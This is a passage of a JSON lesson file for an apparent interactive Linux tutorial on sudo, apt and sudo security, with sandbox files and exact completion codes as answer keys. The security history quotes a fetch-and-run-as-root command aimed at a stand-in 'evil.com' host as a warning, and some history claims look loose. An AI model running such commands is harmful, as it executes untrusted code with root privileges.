{
  "version": "1.0",
  "lessons": [
    {
      "id": "sudo-intro",
      "command": "sudo",
      "code": "sudo",
      "title": "Understanding Superuser Access",
      "tags": ["administration", "security", "basics"],
      "level": "intermediate",
      "module": "administration",
      "about": {
        "what": "The `sudo` command lets you run commands as the **superuser** (root) or another user. The name stands for **'superuser do'** or **'substitute user do'**.\n\n**Why sudo exists:**\n- Root user has unlimited power (can modify any file, kill any process)\n- Logging in as root is dangerous (one typo can destroy the system)\n- sudo provides **temporary** elevated privileges\n- Every sudo command is logged for security auditing\n\n**Basic usage:**\n```bash\nsudo command          # Run command as root\nsudo -u user command  # Run command as specific user\nsudo -i               # Start root shell (careful!)\n```\n\n**Common uses:**\n```bash\nsudo apt install package     # Install software\nsudo systemctl restart nginx # Manage services\nsudo chown user:group file   # Change file ownership\nsudo vim /etc/hosts          # Edit system files\n```",
        "history": "`sudo` was created in 1980 by Bob Coggeshall and Cliff Spencer at SUNY/Buffalo as a safer alternative to the `su` (switch user) command.\n\n**The problem with su:**\nBefore sudo, system administrators used `su` to become root:\n```bash\nsu -           # Become root\n# Now you're root for the entire session\n# One mistake can destroy the system\n```\n\nThis was dangerous:\n- Admins stayed logged in as root for extended periods\n- Typos had catastrophic consequences (`rm -rf / var/log` vs `rm -rf /var/log`)\n- No audit trail of who did what\n- Root password had to be shared among all admins\n\n**sudo's innovations (1980-1990):**\n1. **Temporary elevation** - Run ONE command as root, then back to normal\n2. **Personal passwords** - Use your own password, not root password\n3. **Audit logging** - Every sudo command logged to /var/log/auth.log\n4. **Fine-grained control** - Configure who can run what via /etc/sudoers\n5. **Timeout** - Credentials cached for 15 minutes, then re-prompt\n\n**sudo goes mainstream (1990s-2000s):**\nUbuntu made sudo famous in 2004 by:\n- Disabling the root account entirely\n- Making the first user a sudo user\n- Popularizing \"sudo apt-get install\" pattern\n\nThis approach spread to macOS (2007+) and became the modern standard.\n\n**Modern sudo (2010s-present):**\n- Default on almost all Linux distributions\n- Required for:\n  - Package installation\n  - Service management\n  - System configuration\n  - File ownership changes\n- Security features:\n  - Lecture mode (warns first-time users)\n  - Logging and alerting\n  - Time-based restrictions\n  - Command restrictions\n\n**Fun facts:**\n- The sudo password prompt says \"password for user\" (YOUR password, not root's)\n- The \"lecture\" (\"We trust you have received the usual lecture...\") is famous\n- sudo can send email alerts when users attempt unauthorized commands\n- xkcd comic #149 immortalized sudo with \"sudo make me a sandwich\"",
        "example": "```bash\n# Install a package (requires root)\nsudo apt install nginx\n\n# Edit a system file (requires root)\nsudo vim /etc/nginx/nginx.conf\n\n# Restart a service (requires root)\nsudo systemctl restart nginx\n\n# Change file ownership (requires root)\nsudo chown www-data:www-data /var/www/html/*\n\n# Run previous command with sudo (common mistake fix)\nsudo !!  \n# Example: apt install nginx -> permission denied\n#          sudo !!  -> runs: sudo apt install nginx\n\n# Run command as specific user (not root)\nsudo -u postgres psql\n\n# Open a root shell (use sparingly)\nsudo -i\n# or\nsudo -s\n\n# Check sudo access without running a command\nsudo -v  # Validate credentials, refresh timeout\n\n# List what you can run with sudo\nsudo -l\n```",
        "commonUses": [
          "**Package management** - Install, update, remove software",
          "**Service management** - Start, stop, restart system services",
          "**System configuration** - Edit files in /etc/, modify system settings",
          "**File ownership** - Change owners/groups on system files",
          "**Network administration** - Configure firewall, network interfaces"
        ]
      },
      "hints": [
        "Read the explanation to understand what sudo does",
        "Look at the examples of when you need sudo",
        "The completion code is in the guide file"
      ],
      "sandbox": {
        "startDir": "workspace",
        "dirs": ["workspace"],
        "files": {
          "workspace/task.txt": "Task: Understand when and why to use sudo\n\n1. Read the explanation: cat sudo-explained.txt\n2. Read the examples: cat sudo-examples.txt\n3. Read the best practices: cat sudo-guide.txt\n4. Find the completion code\n\nNote: You cannot actually run sudo in this sandbox,\nbut understanding when and how to use it is essential\nfor Linux system administration.",
          "workspace/sudo-explained.txt": "Understanding sudo\n==================\n\nWhat is sudo?\n-------------\n\nsudo = \"superuser do\" or \"substitute user do\"\n\nIt allows you to run commands with elevated privileges,\ntypically as the root (superuser) account.\n\nWhy does it exist?\n------------------\n\nLinux has two types of users:\n\n1. **Regular users**\n   - Limited permissions\n   - Can only modify their own files\n   - Cannot install software\n   - Cannot change system configuration\n   - Safe: mistakes affect only your files\n   \n2. **Root user (superuser)**\n   - Unlimited permissions\n   - Can modify ANY file\n   - Can install/remove software\n   - Can change system configuration\n   - Dangerous: mistakes can break the entire system\n\nThe Problem:\n------------\n\nSome tasks REQUIRE root access:\n  - Installing software: apt install nginx\n  - Managing services: systemctl restart apache2\n  - Editing system files: /etc/hosts, /etc/nginx/nginx.conf\n  - Changing ownership: chown www-data files\n  - Configuring network: ifconfig, iptables\n\nBut logging in as root is dangerous:\n  - One typo can destroy the system\n  - rm -rf / var/log  (deletes everything!)\n  - No audit trail of who did what\n  - Root password must be shared\n\nThe Solution: sudo\n------------------\n\nsudo gives you TEMPORARY root access:\n\n  $ apt install nginx\n  E: Could not open lock file - permission denied\n  \n  $ sudo apt install nginx\n  [sudo] password for alice: ****\n  Installing nginx...\n  Success!\n  \n  $ # Back to regular user\n\nKey features:\n  ✓ Run ONE command as root\n  ✓ Use YOUR password (not root password)\n  ✓ Every command is logged\n  ✓ Credentials cached for 15 minutes\n  ✓ Then back to normal user\n\nHow it works:\n-------------\n\n1. You try to run a restricted command:\n   $ systemctl restart nginx\n   Failed: Permission denied\n   \n2. You prefix it with sudo:\n   $ sudo systemctl restart nginx\n   \n3. sudo asks for YOUR password:\n   [sudo] password for alice:\n   \n4. sudo checks /etc/sudoers:\n   - Is alice allowed to use sudo?\n   - Is alice allowed to run this command?\n   \n5. If allowed, command runs as root:\n   Restarting nginx: OK\n   \n6. Action is logged:\n   /var/log/auth.log:\n   Dec 31 10:30:15 alice : TTY=pts/0 ; PWD=/home/alice ; \n   USER=root ; COMMAND=/bin/systemctl restart nginx\n\n7. You return to normal user:\n   $ # Back to regular alice user\n\nCredential caching:\n-------------------\n\nAfter first sudo, credentials cached for 15 minutes:\n\n  $ sudo apt update\n  [sudo] password: ****    # Enter password\n  \n  $ sudo apt upgrade\n  # No password prompt - cached!\n  \n  # ... 15 minutes later ...\n  \n  $ sudo systemctl restart nginx\n  [sudo] password: ****    # Password required again\n\nSee sudo-examples.txt for common usage patterns.",
          "workspace/sudo-examples.txt": "Common sudo Usage Examples\n==========================\n\nPackage Management:\n-------------------\n\n# Debian/Ubuntu (apt)\nsudo apt update                    # Update package lists\nsudo apt upgrade                   # Upgrade packages\nsudo apt install nginx             # Install package\nsudo apt remove nginx              # Remove package\n\n# Red Hat/CentOS (yum/dnf)\nsudo yum update\nsudo yum install httpd\n\n# Arch (pacman)\nsudo pacman -Syu                   # System update\nsudo pacman -S package             # Install package\n\nService Management:\n-------------------\n\nsudo systemctl start nginx         # Start service\nsudo systemctl stop nginx          # Stop service\nsudo systemctl restart nginx       # Restart service\nsudo systemctl status nginx        # Check status\nsudo systemctl enable nginx        # Start on boot\nsudo systemctl disable nginx       # Don't start on boot\n\nFile System Operations:\n-----------------------\n\n# Editing system files\nsudo vim /etc/nginx/nginx.conf\nsudo nano /etc/hosts\n\n# Changing ownership\nsudo chown www-data:www-data /var/www/html/*\nsudo chown -R alice:alice /opt/myapp\n\n# Changing permissions\nsudo chmod 644 /etc/nginx/nginx.conf\nsudo chmod 755 /usr/local/bin/script.sh\n\n# Creating directories in system locations\nsudo mkdir /var/www/mysite\nsudo mkdir -p /opt/applications/myapp\n\n# Copying to system locations\nsudo cp config.conf /etc/myapp/\nsudo cp script.sh /usr/local/bin/\n\nNetwork Configuration:\n----------------------\n\nsudo ifconfig eth0 up              # Bring interface up\nsudo ip addr add 192.168.1.10/24   # Configure IP\nsudo route add default gw 192.168.1.1\nsudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT\n\nSystem Logs:\n------------\n\nsudo tail -f /var/log/syslog       # Follow system log\nsudo cat /var/log/auth.log         # View auth log\nsudo journalctl -u nginx           # View service logs\n\nUser Management:\n----------------\n\nsudo useradd -m username           # Create user\nsudo passwd username               # Set password\nsudo usermod -aG sudo username     # Add to sudo group\nsudo userdel username              # Delete user\n\nCommon Shortcuts:\n-----------------\n\n# Run previous command with sudo\n$ apt install nginx\nE: Permission denied\n$ sudo !!\n# Expands to: sudo apt install nginx\n\n# Edit file with sudo\nsudo -e /etc/hosts\n# Opens file in your $EDITOR with sudo privileges\n\n# Refresh sudo credentials (extend timeout)\nsudo -v\n\n# Become root (temporary shell)\nsudo -i   # Login shell (as if you logged in as root)\nsudo -s   # Shell (keeps current environment)\n\n# Run command as different user (not root)\nsudo -u postgres psql\nsudo -u www-data touch /var/www/testfile\n\nDebugging:\n----------\n\n# Check what you can run with sudo\nsudo -l\n\n# Test if you have sudo access\nsudo -v\n\n# See sudo version\nsudo -V\n\nSee sudo-guide.txt for best practices.",
          "workspace/sudo-guide.txt": "sudo Best Practices & Security Guide\n====================================\n\nBest Practices:\n---------------\n\n✅ DO:\n\n1. Use sudo for individual commands:\n   sudo systemctl restart nginx\n   # Elevated for just this command\n   \n2. Use your own password (not root's):\n   [sudo] password for alice: ****\n   \n3. Check what you're about to run:\n   # Be extra careful with rm, mv, chmod, chown\n   sudo rm -rf /var/log/old/*  # Check path carefully!\n   \n4. Use sudo -v to refresh credentials:\n   sudo -v  # Extends timeout without running command\n   \n5. Review sudo logs regularly:\n   sudo grep sudo /var/log/auth.log\n\n❌ DON'T:\n\n1. Don't run GUI apps with sudo:\n   sudo firefox        # ❌ Bad: security risk\n   # GUI apps should run as regular user\n   \n2. Don't edit files directly as root:\n   sudo vim ~/.bashrc  # ❌ Bad: creates root-owned file\n   vim ~/.bashrc       # ✓ Good: regular user file\n   \n3. Don't use sudo -i unless necessary:\n   sudo -i             # ❌ Dangerous: full root shell\n   sudo command        # ✓ Better: one command\n   \n4. Don't share passwords:\n   # Each user should have their own account\n   # Add users to sudo group instead\n   \n5. Don't use sudo for non-system tasks:\n   sudo ./my-script.sh # ❌ Why does this need root?\n   ./my-script.sh      # ✓ Run as regular user if possible\n\nSecurity Tips:\n--------------\n\n1. **Principle of Least Privilege**\n   Only use sudo when absolutely necessary.\n   Most tasks don't need root access.\n   \n2. **Verify commands before running**\n   Double-check destructive commands:\n   - rm -rf\n   - chmod -R\n   - chown -R\n   \n3. **Understand what you're running**\n   Never: curl url | sudo bash  # ❌ Extremely dangerous!\n   Instead: \n     curl url > script.sh\n     cat script.sh              # Review it!\n     chmod +x script.sh\n     sudo ./script.sh\n     \n4. **Use sudo -l to check permissions**\n   sudo -l  # Shows what you're allowed to run\n   \n5. **Monitor sudo usage**\n   sudo tail -f /var/log/auth.log\n   # Watch for suspicious sudo attempts\n\nCommon Mistakes:\n----------------\n\n1. Forgetting sudo:\n   $ apt install nginx\n   E: Permission denied\n   $ sudo !!  # Run previous command with sudo\n   \n2. Using sudo on user files:\n   $ sudo vim ~/.bashrc\n   # Now ~/.bashrc is owned by root!\n   # You can't edit it without sudo anymore\n   # Fix: sudo chown $USER:$USER ~/.bashrc\n   \n3. Piping with sudo:\n   $ sudo echo 'text' > /etc/file  # ❌ Doesn't work\n   # The redirect (>) runs as regular user!\n   $ echo 'text' | sudo tee /etc/file  # ✓ Correct\n   \n4. Sudo in scripts:\n   # ❌ Bad: puts sudo in script\n   #!/bin/bash\n   sudo systemctl restart nginx\n   \n   # ✓ Good: run script with sudo\n   #!/bin/bash\n   systemctl restart nginx\n   # Usage: sudo ./script.sh\n\nWhen NOT to use sudo:\n---------------------\n\n❌ Files in your home directory:\n   vim ~/.bashrc       # Regular user\n   mkdir ~/projects    # Regular user\n   \n❌ Installing user-level tools:\n   npm install package       # Regular user (global requires sudo)\n   pip install --user package  # Regular user\n   \n❌ Running your own programs:\n   ./my-script.sh      # Regular user\n   python app.py       # Regular user\n\nWhen TO use sudo:\n-----------------\n\n✓ System package management:\n  sudo apt install nginx\n  \n✓ System service management:\n  sudo systemctl restart apache2\n  \n✓ Editing system config files:\n  sudo vim /etc/nginx/nginx.conf\n  \n✓ Changing system file ownership:\n  sudo chown www-data:www-data /var/www/html\n  \n✓ Network configuration:\n  sudo ifconfig eth0 up\n  \n✓ Mounting filesystems:\n  sudo mount /dev/sdb1 /mnt/backup\n\nThe sudo Lecture:\n-----------------\n\nFirst time you run sudo, you see:\n\n  We trust you have received the usual lecture from the\n  local System Administrator. It usually boils down to\n  these three things:\n  \n      #1) Respect the privacy of others.\n      #2) Think before you type.\n      #3) With great power comes great responsibility.\n  \n  [sudo] password for alice:\n\nThis is the famous \"sudo lecture\" - a warning that\nyou're about to have root access. Heed it!\n\nAdding Users to sudo:\n---------------------\n\n# Debian/Ubuntu: Add to 'sudo' group\nsudo usermod -aG sudo username\n\n# Red Hat/CentOS: Add to 'wheel' group\nsudo usermod -aG wheel username\n\n# Or edit /etc/sudoers (use visudo!):\nsudo visudo\n# Add: username ALL=(ALL:ALL) ALL\n\nTroubleshooting:\n----------------\n\n1. \"user is not in the sudoers file\":\n   - Your user doesn't have sudo access\n   - Contact system admin to add you to sudo group\n   \n2. \"incorrect password\":\n   - Use YOUR password, not root's\n   - Check if caps lock is on\n   \n3. \"command not found\" with sudo:\n   - sudo uses restricted PATH\n   - Use full path: sudo /usr/local/bin/command\n   \n4. Timeout too short:\n   - Refresh: sudo -v\n   - Or configure timeout in /etc/sudoers\n\n================================================\nCOMPLETION CODE: SUDO-SUPERUSER-MASTERY\n================================================\n\nKey Takeaways:\n--------------\n\n1. sudo = temporary root access\n2. Use for system tasks only\n3. One command at a time\n4. Think before you type\n5. Great power = great responsibility\n\nCommands to remember:\n  sudo command      # Run as root\n  sudo !!           # Run previous command with sudo\n  sudo -v           # Refresh credentials\n  sudo -l           # Check what you can run\n  sudo -i           # Root shell (use sparingly)"
        }
      },
      "instructions": "## Your Task\n\nLearn about sudo and when to use superuser privileges.\n\n**Steps:**\n1. Read the task: `cat task.txt`\n2. Read the explanation: `cat sudo-explained.txt`\n3. Review examples: `cat sudo-examples.txt`\n4. Study best practices: `cat sudo-guide.txt`\n5. Find and copy the completion code\n6. Type `exit` and paste the code\n\n**Learn:** sudo provides temporary root access for system tasks. Use it for package management, service control, and system configuration. Think before you type!",
      "requirements": [
        {
          "type": "command_output",
          "description": "The completion code from the sudo guide",
          "validator": "exact",
          "expected": "SUDO-SUPERUSER-MASTERY"
        }
      ]
    },
    {
      "id": "sudo-apt",
      "command": "sudo",
      "code": "sudo apt",
      "title": "Package Management with sudo",
      "tags": ["administration", "packages", "intermediate"],
      "level": "intermediate",
      "module": "administration",
      "about": {
        "what": "Package management requires **sudo** because installing, updating, or removing software affects the entire system.\n\n**Common package operations:**\n```bash\nsudo apt update              # Update package lists\nsudo apt upgrade             # Upgrade installed packages\nsudo apt install package     # Install new package\nsudo apt remove package      # Remove package\nsudo apt autoremove          # Remove unused dependencies\n```\n\n**Why sudo is required:**\n- Packages install to `/usr/bin`, `/usr/lib`, `/etc` (system directories)\n- Regular users can't write to these locations\n- Installation affects all users on the system\n- Security: prevents malicious users from installing backdoors\n\n**Package managers by distribution:**\n- Debian/Ubuntu: `apt`, `apt-get`\n- Red Hat/CentOS: `yum`, `dnf`\n- Arch: `pacman`\n- Alpine: `apk`\n- macOS: `brew` (doesn't need sudo for user-space installs)",
        "history": "Package management revolutionized software installation in the 1990s.\n\n**Before package managers (1980s):**\nInstalling software on Unix was manual:\n1. Download source code (often via FTP or tape)\n2. Extract: `tar -xzf software.tar.gz`\n3. Compile: `./configure && make`\n4. Install: `make install` (as root)\n\nProblems:\n- No dependency tracking (you had to find and install dependencies manually)\n- No version management (can't easily upgrade)\n- No uninstallation (files scattered across system)\n- Compilation required (time-consuming, error-prone)\n\n**The package manager revolution:**\n\n**1994: Debian's dpkg/apt**\nDebian introduced dpkg (package format) and later apt (Advanced Package Tool):\n- Binary packages (no compilation needed)\n- Automatic dependency resolution\n- Version tracking\n- Clean uninstallation\n- Central repository\n\nRevolutionary command:\n```bash\nsudo apt-get install apache2\n```\nThis ONE command:\n- Downloaded Apache and all dependencies\n- Verified checksums\n- Installed to correct locations\n- Configured for the system\n- Set up automatic start\n\n**1997: Red Hat's RPM/yum**\nRed Hat created RPM (Red Hat Package Manager) and yum:\n- Similar to apt but for Red Hat-based systems\n- Became standard for RHEL, CentOS, Fedora\n\n**2000s: Other package managers**\n- Arch's pacman (2002) - Fast, simple\n- Gentoo's portage - Source-based (compiles)\n- Alpine's apk - Minimal, fast\n\n**2010s: Language-specific package managers**\nLanguages created their own package ecosystems:\n- npm (Node.js) - 2010\n- pip (Python) - 2008\n- cargo (Rust) - 2014\n- go get (Go) - 2009\n\nThese DON'T require sudo (install to user space), but system-wide packages still do.\n\n**Why sudo is required:**\nPackage managers install to system directories:\n- `/usr/bin` - Executable programs\n- `/usr/lib` - Shared libraries\n- `/etc` - Configuration files\n- `/usr/share` - Shared data\n\nRegular users can't write here (security). Only root can, via sudo.\n\n**Modern best practice:**\n```bash\n# System packages: Use sudo\nsudo apt install nginx\n\n# User packages: No sudo\nnpm install package        # Installs to ~/node_modules\npip install --user package # Installs to ~/.local\n```\n\nThis separation keeps user space independent from system space.",
        "example": "```bash\n# Update package lists (check for new versions)\nsudo apt update\n\n# Upgrade all installed packages\nsudo apt upgrade\n\n# Install a package\nsudo apt install nginx\n\n# Install multiple packages\nsudo apt install nginx postgresql redis\n\n# Remove a package (keep config files)\nsudo apt remove nginx\n\n# Remove package and config files\nsudo apt purge nginx\n\n# Remove unused dependencies\nsudo apt autoremove\n\n# Search for packages\napt search nginx          # No sudo needed (just searching)\n\n# Show package info\napt show nginx            # No sudo needed (just viewing)\n\n# List installed packages\napt list --installed      # No sudo needed\n\n# Common workflow: update then upgrade\nsudo apt update && sudo apt upgrade\n\n# Install with automatic yes\nsudo apt install -y nginx\n\n# Simulate install (dry run)\napt install --dry-run nginx  # No sudo needed\n```",
        "commonUses": [
          "**Installing web servers** - nginx, apache2",
          "**Installing databases** - postgresql, mysql, redis",
          "**Installing development tools** - git, build-essential, python3",
          "**System updates** - Regular security and feature updates",
          "**Installing utilities** - curl, wget, htop, vim"
        ]
      },
      "hints": [
        "Read about why package management needs sudo",
        "Review the common apt commands",
        "The completion code is in the workflow guide"
      ],
      "sandbox": {
        "startDir": "workspace",
        "dirs": ["workspace"],
        "files": {
          "workspace/task.txt": "Task: Learn about package management with sudo apt\n\n1. Read the explanation: cat apt-explained.txt\n2. Review common commands: cat apt-commands.txt\n3. Study the workflow: cat apt-workflow.txt\n4. Find the completion code\n\nNote: You cannot actually run apt commands in this sandbox,\nbut understanding apt is essential for managing Linux systems.",
          "workspace/apt-explained.txt": "Package Management with APT\n============================\n\nWhat is APT?\n------------\n\nAPT = Advanced Package Tool\n\nIt's the package manager for Debian-based Linux distributions:\n  - Debian\n  - Ubuntu\n  - Linux Mint\n  - Pop!_OS\n  - Raspberry Pi OS\n\nWhat does it do?\n----------------\n\nAPT manages software installation:\n  ✓ Downloads packages from repositories\n  ✓ Resolves dependencies automatically\n  ✓ Installs software to correct locations\n  ✓ Tracks installed packages\n  ✓ Updates software\n  ✓ Removes software cleanly\n\nWhy sudo is required:\n---------------------\n\nPackages install to SYSTEM directories:\n\n  /usr/bin/          - Executable programs\n  /usr/lib/          - Shared libraries\n  /usr/share/        - Shared data files\n  /etc/              - Configuration files\n  /var/lib/          - Package data\n\nRegular users CANNOT write to these directories.\nOnly root can (via sudo).\n\nExample:\n--------\n\nWithout sudo:\n  $ apt install nginx\n  E: Could not open lock file /var/lib/dpkg/lock-frontend\n  E: Permission denied\n  \nWith sudo:\n  $ sudo apt install nginx\n  [sudo] password for alice: ****\n  Reading package lists... Done\n  Building dependency tree... Done\n  Installing nginx...\n  Setting up nginx...\n  Success!\n\nWhat happens during installation:\n----------------------------------\n\n1. Download package:\n   /var/cache/apt/archives/nginx_1.18.0.deb\n   \n2. Extract files:\n   /usr/sbin/nginx              (executable)\n   /etc/nginx/nginx.conf        (config)\n   /var/www/html/index.html     (default page)\n   /lib/systemd/system/nginx.service (service)\n   \n3. Run post-install scripts:\n   - Create nginx user\n   - Set permissions\n   - Enable service\n   \n4. Update package database:\n   /var/lib/dpkg/status\n\nAll of these steps require root access!\n\nSee apt-commands.txt for common operations.",
          "workspace/apt-commands.txt": "Common APT Commands\n===================\n\nUpdating Package Lists:\n-----------------------\n\nsudo apt update\n\nWhat it does:\n  - Downloads latest package lists from repositories\n  - Updates information about available packages\n  - Checks for newer versions of installed packages\n  - Does NOT install anything\n\nRun this BEFORE installing or upgrading packages.\n\nUpgrading Packages:\n-------------------\n\nsudo apt upgrade\n\nWhat it does:\n  - Upgrades all installed packages to latest versions\n  - Downloads and installs updates\n  - Keeps existing packages (won't remove)\n\nAlways run 'sudo apt update' first!\n\nCombined:\n  sudo apt update && sudo apt upgrade\n\nInstalling Packages:\n--------------------\n\n# Install single package\nsudo apt install nginx\n\n# Install multiple packages\nsudo apt install nginx postgresql redis\n\n# Install with automatic yes (no prompts)\nsudo apt install -y nginx\n\n# Reinstall a package\nsudo apt install --reinstall nginx\n\nRemoving Packages:\n------------------\n\n# Remove package (keep config files)\nsudo apt remove nginx\n\n# Remove package AND config files\nsudo apt purge nginx\n\n# Remove unused dependencies\nsudo apt autoremove\n\n# Remove package and clean up\nsudo apt purge nginx && sudo apt autoremove\n\nSearching Packages:\n-------------------\n\n# Search for packages (no sudo needed)\napt search nginx\napt search \"web server\"\n\n# Show package details (no sudo needed)\napt show nginx\n\n# List all available packages\napt list\n\n# List installed packages only\napt list --installed\n\n# List upgradeable packages\napt list --upgradeable\n\nCleaning Up:\n------------\n\n# Remove downloaded package files\nsudo apt clean\n\n# Remove old package files (keep recent)\nsudo apt autoclean\n\n# Remove unused dependencies\nsudo apt autoremove\n\nCommon Combinations:\n--------------------\n\n# Update and upgrade system\nsudo apt update && sudo apt upgrade -y\n\n# Install package quietly\nsudo apt install -y nginx\n\n# Full system upgrade (may remove packages)\nsudo apt full-upgrade\n\n# Install and clean up in one command\nsudo apt install nginx && sudo apt autoremove\n\nChecking Package Status:\n------------------------\n\n# Check if package is installed\ndpkg -l | grep nginx\n\n# Show package info\napt show nginx\n\n# List files in package\ndpkg -L nginx\n\n# Find which package provides a file\ndpkg -S /usr/sbin/nginx\n\nSee apt-workflow.txt for practical workflows.",
          "workspace/apt-workflow.txt": "APT Workflows and Best Practices\n=================================\n\nDaily Workflow:\n---------------\n\n1. **Before installing anything:**\n   sudo apt update\n   # Always update package lists first\n   \n2. **Install what you need:**\n   sudo apt install package-name\n   \n3. **Clean up:**\n   sudo apt autoremove\n   # Remove dependencies no longer needed\n\nWeekly Maintenance:\n-------------------\n\n# Update and upgrade everything\nsudo apt update\nsudo apt upgrade\nsudo apt autoremove\nsudo apt autoclean\n\n# One-liner:\nsudo apt update && sudo apt upgrade -y && sudo apt autoremove -y\n\nSetting Up New Server:\n----------------------\n\n# Step 1: Update system\nsudo apt update\nsudo apt upgrade -y\n\n# Step 2: Install essentials\nsudo apt install -y \\\n  git \\\n  curl \\\n  wget \\\n  vim \\\n  htop \\\n  build-essential\n\n# Step 3: Install web stack\nsudo apt install -y \\\n  nginx \\\n  postgresql \\\n  redis-server\n\n# Step 4: Clean up\nsudo apt autoremove -y\nsudo apt autoclean\n\nTroubleshooting:\n----------------\n\n1. **Broken packages:**\n   sudo apt --fix-broken install\n   sudo dpkg --configure -a\n   \n2. **Lock file errors:**\n   # Another apt process is running\n   # Wait for it to finish, or:\n   sudo rm /var/lib/dpkg/lock-frontend\n   sudo rm /var/lib/dpkg/lock\n   sudo dpkg --configure -a\n   \n3. **Failed to fetch:**\n   # Repository is down or network issue\n   sudo apt update\n   # Try different mirror\n   \n4. **Dependency issues:**\n   sudo apt install -f\n   # Fix missing dependencies\n\nBest Practices:\n---------------\n\n✅ DO:\n\n1. Always update before installing:\n   sudo apt update\n   sudo apt install nginx\n   \n2. Review what will be installed:\n   sudo apt install nginx\n   # Read the list before confirming\n   \n3. Keep system updated:\n   sudo apt update && sudo apt upgrade\n   # Run weekly\n   \n4. Clean up regularly:\n   sudo apt autoremove\n   sudo apt autoclean\n   \n5. Use -y flag in scripts:\n   sudo apt install -y nginx\n   # No manual confirmation needed\n\n❌ DON'T:\n\n1. Don't upgrade without updating:\n   sudo apt upgrade  # ❌ Update first!\n   \n2. Don't blindly upgrade:\n   sudo apt upgrade -y  # ❌ Review changes first!\n   # On production servers, test updates carefully\n   \n3. Don't run apt as root directly:\n   su -               # ❌ Don't become root\n   apt install nginx  # ❌ Use sudo instead\n   \n4. Don't add untrusted repositories:\n   # Only add PPAs from trusted sources\n   # They have full system access!\n   \n5. Don't interrupt apt:\n   # Let it finish completely\n   # Interrupting can break package database\n\nReal-World Scenarios:\n---------------------\n\n**Scenario 1: Web Server Setup**\n\nsudo apt update\nsudo apt install -y nginx\nsudo systemctl start nginx\nsudo systemctl enable nginx\ncurl localhost  # Test it works\n\n**Scenario 2: Development Environment**\n\nsudo apt update\nsudo apt install -y \\\n  git \\\n  nodejs \\\n  npm \\\n  python3 \\\n  python3-pip \\\n  postgresql\n\n**Scenario 3: System Update**\n\n# Check what will be updated\nsudo apt update\napt list --upgradeable\n\n# Review the list\n# If OK, proceed:\nsudo apt upgrade\n\n# Clean up\nsudo apt autoremove\n\n**Scenario 4: Package Removal**\n\n# Remove nginx completely\nsudo systemctl stop nginx\nsudo systemctl disable nginx\nsudo apt purge nginx\nsudo apt autoremove\n\n# Verify removal\nwhich nginx  # Should return nothing\n\nSecurity Notes:\n---------------\n\n1. **Regular updates are critical:**\n   Security patches are distributed via apt\n   Run 'sudo apt update && sudo apt upgrade' weekly\n   \n2. **Unattended upgrades:**\n   sudo apt install unattended-upgrades\n   # Automatically install security updates\n   \n3. **Check before upgrading servers:**\n   # Test updates in staging environment\n   # Read changelogs for breaking changes\n   # Have rollback plan ready\n   \n4. **Repository trust:**\n   APT verifies packages with GPG signatures\n   Only add trusted repositories\n   Compromised repo = compromised system\n\nCommon Packages:\n----------------\n\n**Web Development:**\n  nginx, apache2, nodejs, npm\n  \n**Databases:**\n  postgresql, mysql-server, redis-server, mongodb\n  \n**Languages:**\n  python3, python3-pip, ruby, golang, rustc\n  \n**Tools:**\n  git, curl, wget, vim, tmux, htop, net-tools\n  \n**Build Tools:**\n  build-essential, cmake, make, gcc, g++\n\n================================================\nCOMPLETION CODE: SUDO-APT-PACKAGE-MASTER\n================================================\n\nKey Takeaways:\n--------------\n\n1. Always 'sudo apt update' before installing\n2. Review packages before confirming\n3. Clean up with 'sudo apt autoremove'\n4. Keep system updated for security\n5. apt needs sudo because it modifies system directories\n\nEssential commands:\n  sudo apt update              # Update package lists\n  sudo apt upgrade             # Upgrade packages\n  sudo apt install package     # Install package\n  sudo apt remove package      # Remove package\n  sudo apt autoremove          # Clean up"
        }
      },
      "instructions": "## Your Task\n\nLearn about package management with sudo apt.\n\n**Steps:**\n1. Read the task: `cat task.txt`\n2. Read the explanation: `cat apt-explained.txt`\n3. Review commands: `cat apt-commands.txt`\n4. Study workflows: `cat apt-workflow.txt`\n5. Find and copy the completion code\n6. Type `exit` and paste the code\n\n**Learn:** Package management requires sudo because packages install to system directories. Always update before installing. Keep your system updated for security.",
      "requirements": [
        {
          "type": "command_output",
          "description": "The completion code from the apt workflow guide",
          "validator": "exact",
          "expected": "SUDO-APT-PACKAGE-MASTER"
        }
      ]
    },
    {
      "id": "sudo-security",
      "command": "sudo",
      "code": "sudo security",
      "title": "sudo Security Best Practices",
      "tags": ["administration", "security", "advanced"],
      "level": "advanced",
      "module": "administration",
      "about": {
        "what": "Understanding sudo **security** is critical for system administration. sudo is powerful but can be dangerous if misused.\n\n**Key security principles:**\n\n1. **Principle of Least Privilege**\n   - Only use sudo when necessary\n   - Return to normal user immediately after\n   - Don't run entire sessions as root\n\n2. **Think Before You Type**\n   - Verify destructive commands carefully\n   - Understand what a command does before running with sudo\n   - One mistake can destroy the system\n\n3. **Audit Trail**\n   - Every sudo command is logged\n   - Logs stored in `/var/log/auth.log` (Debian/Ubuntu)\n   - Review logs for suspicious activity\n\n4. **User Isolation**\n   - Each admin uses their own account\n   - No shared root password\n   - Accountability: know who did what\n\n**Common security mistakes:**\n- Running GUI apps with sudo (security risk)\n- Using `sudo -i` for extended periods (unlimited power)\n- Piping untrusted input to sudo commands\n- Not reviewing sudo logs\n- Giving sudo access too broadly",
        "history": "sudo security has evolved through painful lessons learned over 40+ years.\n\n**The su era problems (1970s-1990s):**\nBefore sudo became standard, admins used `su` (switch user):\n```bash\nsu -        # Become root\n# Stay as root for hours\n# One typo: rm -rf / var/log  (deletes everything!)\n```\n\nReal incidents:\n- **1986**: Morris Worm exploited weak passwords to su to root\n- **Early 1990s**: Countless systems destroyed by accidental `rm -rf /`\n- **No accountability**: Multiple admins sharing root password, can't tell who broke what\n\n**sudo's security improvements (1980-2000):**\n\n1. **Temporary elevation (1980):**\n   Run ONE command as root, not entire session\n   Reduces window of vulnerability\n\n2. **Personal passwords (1980):**\n   Use your own password, not root's\n   No password sharing\n   Each admin accountable\n\n3. **Logging (1980s):**\n   Every sudo command logged with:\n   - Who ran it (username)\n   - When (timestamp)\n   - What command\n   - From where (terminal)\n   \n4. **Timeout (1980s):**\n   Credentials cached for 15 minutes\n   Then require password again\n   Prevents walking away with sudo active\n\n5. **Fine-grained control (1990s):**\n   /etc/sudoers file controls:\n   - Who can use sudo\n   - Which commands they can run\n   - Whether password is required\n   - From which hosts\n\n**Major security incidents (2000s-2010s):**\n\n1. **The sudo pipe vulnerability (2000s):**\n   ```bash\n   wget http://evil.com/script.sh -O - | sudo bash\n   ```\n   Downloads and runs untrusted code as root!\n   Many systems compromised via this pattern\n   \n2. **The GUI sudo 